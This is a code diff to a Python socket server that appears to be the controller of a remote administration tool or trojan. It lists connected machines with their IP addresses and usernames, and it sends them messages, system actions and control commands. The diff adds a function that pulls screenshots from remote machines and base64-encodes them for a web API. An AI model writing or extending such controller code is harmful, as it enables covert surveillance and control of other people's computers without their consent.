@@ -3,9 +3,9 @@ import threading
 import asyncio
 import socket
 import random
+import base64
 import time
 import json
-import os
 
 # third-party libraries
 from prettytable import PrettyTable
@@ -15,14 +15,52 @@ import webapi
 # global variables
 table = PrettyTable()
 table.field_names = ["ID", "Computer", "IP Address", "Username"]
-
-bufferSize = 1024
 clients = []
 
 # utility functions
-def receive(client, decode=True):
-   data = client.recv(bufferSize)
-   return data.decode() if decode else data
+def get_client(connection):
+   for client in clients:
+      if (client['connection_id'] == connection):
+         return client
+
+def receive(connection, decode=True, buffer=1024):
+   try:
+      client = None
+
+      for c in clients:
+         if (c['connection_id'] == connection):
+            client = c['socket']
+            break
+
+      if (client is None):
+         raise socket.error
+      
+      data = client.recv(buffer)
+      return data.decode() if decode else data
+   
+   except (UnicodeDecodeError, IndexError, AttributeError, socket.error):
+      return None
+   
+def receive_all(connection, decode=True, buffer=1024):
+   try:
+      client = None
+
+      for c in clients:
+         if (c['connection_id'] == connection):
+            client = c['socket']
+            break
+
+      if (client is None):
+         raise socket.error
+
+      data = client.recv(buffer)
+      while (len(data) < buffer):
+         data += client.recv(buffer)
+
+      return data.decode() if decode else data
+
+   except (IndexError, AttributeError, socket.error):
+      return None
 
 def send_and_receive(connection, data, provideSize=False, decode=True):
    try:
@@ -45,10 +83,11 @@ def send_and_receive(connection, data, provideSize=False, decode=True):
       else:
          client.send(data.encode())
          
-      return receive(client, decode)
+      data = client.recv(1024)
+      return data.decode() if decode else data
 
    except (IndexError, AttributeError, socket.error):
-      return list()
+      return None
 
 def isConnected(connection):
    try:
@@ -79,7 +118,7 @@ def ManageConnections(command, connection=None):
          for client in deadClients:
             clients.remove(client)
 
-         return [] if len(clients) < 1 else clients
+         return list() if len(clients) < 1 else clients
 
       elif (command == 'connect' and connection is not None):
          try:
@@ -136,6 +175,15 @@ def SendMessage(connection, message):
       status = send_and_receive(connection, message, True)
       return status
    
+def Screenshot(connection):
+   response = send_and_receive(connection, 'screenshot')
+   if ('captured' in response):
+      fileSize = int(receive(connection))
+      data = receive_all(connection, False, fileSize)
+      return base64.b64encode(data)
+   
+   return None
+   
 def SystemAction(connection, action):
    response = send_and_receive(connection, action)
    if (action in response):
@@ -173,7 +221,7 @@ def RemoteConnect(server, port):
    while (True):
       try:
          client, _ = objSocket.accept()
-         data = json.loads(receive(client))
+         data = json.loads(client.recv(1024).decode())
          connectionId = random.randint(100000000, 999999999)
 
          for c in clients:
@@ -218,6 +266,7 @@ webapi.api.ManageConnections = ManageConnections
 webapi.api.ControlClient = ControlClient
 webapi.api.ClientInformation = ClientInformation
 webapi.api.SendMessage = SendMessage
+webapi.api.Screenshot = Screenshot
 webapi.api.SystemAction = SystemAction
 
 server_thread = threading.Thread(target=start_websocket_server)
